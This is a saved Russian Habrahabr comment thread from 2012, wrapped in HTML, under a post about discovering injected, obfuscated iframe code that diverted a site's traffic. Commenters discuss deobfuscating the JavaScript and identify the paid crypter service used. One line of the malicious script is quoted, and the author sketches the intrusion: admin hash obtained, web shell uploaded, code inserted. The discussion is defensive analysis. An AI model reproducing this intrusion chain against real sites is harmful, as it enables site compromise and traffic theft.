+		<div class="message ">
+			Согласен. Тоже интересует.<br>
+<blockquote>Раскодируем поэтапно скрипт воспользовавшись обратными функциями:</blockquote><br>
+<br>
+Совершенно неясно какими обратными функциями Вы пользовались. Обычно для расшифровки обфусцированного Java Script достаточно вызвать через alert() зашифрованные данные после их расшифровки самим скриптом. Но здесь этого не происходит. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561521">
+	 
+		
+<div class="comment_item" id="comment_4561523">
+	
+	
+		<div class="info  	" rel="4561523">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561523" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;3 и &darr;0">+3</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="username">AlexanderPHP</a>
+			<time datetime="2012-01-26T10:05:18+04:00">26 января 2012, 10:05</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561523" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561521" data-id="4561523" data-parent_id="4561521" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Сегодня буду писать подробную статью, как это делается. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561523">
+	 
+		
+<div class="comment_item" id="comment_4561537">
+	
+	
+		<div class="info  	" rel="4561537">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561537" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/guyfawkes/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/40414_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/guyfawkes/" class="username">guyfawkes</a>
+			<time datetime="2012-01-26T10:16:02+04:00">26 января 2012, 10:16</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561537" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561523" data-id="4561537" data-parent_id="4561523" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Только хотел задать тот же вопрос. Очень буду ждать. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561537">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561564">
+	
+	
+		<div class="info  	" rel="4561564">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561564" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Zyamilon/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/27276_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Zyamilon/" class="username">Zyamilon</a>
+			<time datetime="2012-01-26T10:33:48+04:00">26 января 2012, 10:33</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561564" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561523" data-id="4561564" data-parent_id="4561523" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Вот да! Будет шикарно!<br>
+И это, если возможно, затроньте не только JS, но и другие скриптовые языки. Наверняка ведь есть какие-то общие моменты.<br>
+PHP например. Там тоже встречал монструозные, страшные конструкции когда искал примеры кода.<br>
+<br>
+А, и еще момент по теме анализа! Знаете, бывает хочешь посмотреть какой-нибудь скрипт, открываешь, а он не для людей совсем. Т.е. для машины синтаксис правильный, но сам код в пару длииииинных строчек. Как с этим быть? Существуют ли ~«pretty_print'еры»? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561564">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561582">
+	
+	
+		<div class="info  	" rel="4561582">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561582" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 1: &uarr;0 и &darr;1">–1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/shanker/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/47073_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/shanker/" class="username">shanker</a>
+			<time datetime="2012-01-26T10:52:00+04:00">26 января 2012, 10:52</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561582" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561523" data-id="4561582" data-parent_id="4561523" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad1">
+			Спасибо, конечно. Но зачем плодить статьи? Почему нельзя сделать одну полноценную? Если из данной статьи выбросить весь код, который так и не объяснён как деобфусцирован, то статья получится в 3 строчки. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561582">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561667">
+	
+	
+		<div class="info  	" rel="4561667">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561667" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AHDPEu/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AHDPEu/" class="username">AHDPEu</a>
+			<time datetime="2012-01-26T11:30:19+04:00">26 января 2012, 11:30</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561667" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561521" data-id="4561667" data-parent_id="4561521" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			В данном случает даже alert не нужен. Firebug -&gt; сценарии -&gt; показывать eval-скрипты -&gt; найти, что он выполнил. <br>
+Опасное занятие, случайно пробить себя сплоитом плёвое дело. Но если уже загрузили страницу, можно одним глазком подглядеть. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561667">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561532">
+	
+	
+		<div class="info  	" rel="4561532">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561532" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Sitta/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/36335_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Sitta/" class="username">Sitta</a>
+			<time datetime="2012-01-26T10:13:25+04:00">26 января 2012, 10:13</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561532" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561439" data-id="4561532" data-parent_id="4561439" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Конечно не руками. Если посмотреть ссылку выше на antichat, то нетрудно найти тему где автор поделки предоставляет услуги шифрования javascript<br>
+<a href="http://forum.antichat.ru/thread303899.html">forum.antichat.ru/thread303899.html</a> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561532">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561562">
+	
+	
+		<div class="info  	" rel="4561562">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561562" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Vladson/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/43807_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Vladson/" class="username">Vladson</a>
+			<time datetime="2012-01-26T10:30:58+04:00">26 января 2012, 10:30</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561562" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561439" data-id="4561562" data-parent_id="4561439" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Обфускаторов полно подобных, платных, бесплатных, левых, правых…<br>
+<br>
+<a href="http://utf-8.jp/public/jjencode.html">Например такой</a> вроде тут (на Хабре в смысле) о нём и вычитал, и по моему там было и инфо о раскодировке… 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561562">
+	 
+		
+<div class="comment_item" id="comment_4561565">
+	
+	
+		<div class="info  	" rel="4561565">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561565" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Vladson/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/43807_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Vladson/" class="username">Vladson</a>
+			<time datetime="2012-01-26T10:34:20+04:00">26 января 2012, 10:34</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561565" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561562" data-id="4561565" data-parent_id="4561562" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			<a href="http://habrahabr.ru/blogs/javascript/112530/">Вот тут немного на эту тему</a><br>
+ 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561565">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561711">
+	
+	
+		<div class="info  	" rel="4561711">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561711" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Horzerus/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Horzerus/" class="username">Horzerus</a>
+			<time datetime="2012-01-26T11:48:04+04:00">26 января 2012, 11:48</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561711" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			AlexanderPHP: а использовалась готовая CMS? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561711">
+	 
+		
+<div class="comment_item" id="comment_4561759">
+	
+	
+		<div class="info  	" rel="4561759">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561759" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="username">AlexanderPHP</a>
+			<time datetime="2012-01-26T12:13:18+04:00">26 января 2012, 12:13</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561759" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561711" data-id="4561759" data-parent_id="4561711" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Самописная, нашел там шелл, через который вставили потом код.<br>
+Действия следующие: получили хеш админа, залили шел, вставили код. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561759">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4562325">
+	
+	
+		<div class="info  	" rel="4562325">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562325" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Ekstazi/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Ekstazi/" class="username">Ekstazi</a>
+			<time datetime="2012-01-26T15:30:25+04:00">26 января 2012, 15:30</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562325" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Как вы расшифровали код плохо понял, ну да ладно, сам имел дело с чем-то подобным года 3 назад. Принцип тот же был. Спасибо, не думал что такое еще встречается где-то. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562325">
+	 
+		
+<div class="comment_item" id="comment_4562344">
+	
+	
+		<div class="info  	" rel="4562344">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562344" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Ekstazi/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Ekstazi/" class="username">Ekstazi</a>
+			<time datetime="2012-01-26T15:34:48+04:00">26 января 2012, 15:34</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562344" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562325" data-id="4562344" data-parent_id="4562325" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Почему-то кажется мне что надо узнать значение $w и внутри функции $sA значение $E[$d.$fJ]($j), тогда весь скрипт станет как на ладони, делать это на своем ноуте правда не хочется… 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562344">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4562327">
+	
+	
+		<div class="info  	" rel="4562327">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562327" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/mirvla/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/58383_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/mirvla/" class="username">mirvla</a>
+			<time datetime="2012-01-26T15:30:43+04:00">26 января 2012, 15:30</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562327" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			<i>я увидел, что чуть-чуть сместился один div</i> — глаз алмаз ) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562327">
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4562507">
+	
+	
+		<div class="info  	" rel="4562507">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562507" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Hellriser/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/54430_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Hellriser/" class="username">Hellriser</a>
+			<time datetime="2012-01-26T16:27:13+04:00">26 января 2012, 16:27</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562507" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Интересно, RequestPolicy для FF видит такое/спасает от подобного? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562507">
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4562525">
+	
+	
+		<div class="info  	" rel="4562525">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562525" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/lacki/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/5508_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/lacki/" class="username">lacki</a>
+			<time datetime="2012-01-26T16:34:02+04:00">26 января 2012, 16:34</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562525" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			А что это за трюк?<br>
+<code>_q[_n]('frameborder', navigator.userAgent.indexOf('f0a7a142b755172da72ff74a1ac25199') + 1);<br>
+</code><br>
+Понятно что setAttribute('frameborder', 0) в частном случае, но зачем извращение с f0a7a142b755172da72ff74a1ac25199 и что это в целом за магическая строка? Может троянчеки должны в юзер агент вписывать эту строку и ставить бордер отличный от нуля для ранее зараженных пользователей, но опять таки зачем? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562525">
+	 
+		
+<div class="comment_item" id="comment_4562826">
+	
+	
+		<div class="info  	" rel="4562826">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562826" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 1: &uarr;0 и &darr;1">–1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Violinist/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/12594_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Violinist/" class="username">Violinist</a>
+			<time datetime="2012-01-26T18:01:30+04:00">26 января 2012, 18:01</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562826" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562525" data-id="4562826" data-parent_id="4562525" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad1">
+			Код аналогичен _q.setAttribute('frameborder, 0);. Делается для того чтобы убрать рамку трехмерную вокруг iframe. Магическая константа — md5 хеш, если кто расшифрует — будет понятнее. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562826">
+	 
+		
+<div class="comment_item" id="comment_4562848">
+	
+	
+		<div class="info  	" rel="4562848">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562848" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 2: &uarr;1 и &darr;1">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Violinist/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/12594_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Violinist/" class="username">Violinist</a>
+			<time datetime="2012-01-26T18:08:49+04:00">26 января 2012, 18:08</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562848" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562826" data-id="4562848" data-parent_id="4562826" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			navigator.userAgent.indexOf('f0a7a142b755172da72ff74a1ac25199') всегда возвращает -1, так что не думаю что в этом хеше есть что-то интересное. Более вероятно добавлен для того чтобы наверняка не оказаться в UserAgent браузера. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562848">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4563263">
+	
+	
+		<div class="info  	" rel="4563263">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563263" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 1: &uarr;0 и &darr;1">–1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/cyberpunkyc/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/53197_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/cyberpunkyc/" class="username">cyberpunkyc</a>
+			<time datetime="2012-01-26T21:11:44+04:00">26 января 2012, 21:11</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563263" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad1">
+			Узнаю знакомый криптер — <a href="http://cryptoservice.info/">cryptoservice.info/</a> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563263">
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4563369">
+	
+	
+		<div class="info  	" rel="4563369">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563369" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/S1eng/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/44830_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/S1eng/" class="username">S1eng</a>
+			<time datetime="2012-01-26T22:00:46+04:00">26 января 2012, 22:00</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563369" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Стало интересно чем это закриптованно, нагуглил их сервис — cryptoservice.info, и видать до них дошел хабраэффект, так как в новостях они написали: <br>
+<i>Наш сервис относительно молод, но функционал наш велик. Спустя несколько месяцев с начала нашей работы мы заметили, что у нас превалирует часть клиентов, криптующих исключительно iframe, хотя сервис изначально задумывался как платный криптер/обфускатор Javascript-кода вообще. Теперь мы видим, что это используется для распространения вредоносного ПО. С этого момента мы прекращаем криптовать iframe-коды. Доступными останутся только криптеры Javascript, контента и ссылок. В течении недели криптер iframe будет убран с нашего сервиса. Пользователям с уже оплаченным аккаунтом iframe-криптер будет доступен до истечения аккаунта.</i> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563369">
+	 
+		
+<div class="comment_item" id="comment_4571366">
+	
+	
+		<div class="info  	" rel="4571366">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4571366" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/jartashi/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/jartashi/" class="username">jartashi</a>
+			<time datetime="2012-01-30T16:38:24+04:00">30 января 2012, 16:38</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4571366" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563369" data-id="4571366" data-parent_id="4563369" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			<i>Наш сервис относительно молод, но функционал наш велик</i><br>
+в мемориз<br>
+ 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4571366">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+  
